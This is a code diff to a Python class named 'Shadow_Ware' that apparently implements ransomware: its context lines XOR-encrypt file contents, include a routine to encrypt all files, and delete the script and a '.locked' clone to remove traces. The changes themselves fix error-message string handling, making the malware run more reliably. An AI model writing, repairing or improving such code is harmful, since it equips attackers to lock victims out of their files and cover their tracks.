@@ -61,20 +61,20 @@ class Shadow_Ware():
       with open(input_file, "rb") as file:
           data = file.read()
     except Exception as e:
-      print("Failed to read " + input_file + " because " + e)
+      print("Failed to read " + input_file + " because " + str(e))
 
     try:
       encrypted_data = bytearray(len(data))
       for i in range(len(data)):
           encrypted_data[i] = data[i] ^ self.bytes_key[i % len(self.bytes_key)]
     except Exception as e:
-      print("Failed to encrypt data of " + input_file + " because " + e)
+      print("Failed to encrypt data of " + input_file + " because " + str(e))
 
     try:
       with open(output_file, "wb") as file:
           file.write(encrypted_data)
     except Exception as e:
-      print("Failed to write encrypted data to " + output_file + " because " + e)
+      print("Failed to write encrypted data to " + output_file + " because " + str(e))
 
   # Encrypt All Files
   def encrypt_all_files(self):
@@ -105,7 +105,7 @@ class Shadow_Ware():
     try:
       os.remove(os.path.abspath(__file__ + ".locked"))
     except Exception as e:
-      print("Failed to kill clone for " + e)
+      print("Failed to kill clone for " + str(e))
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
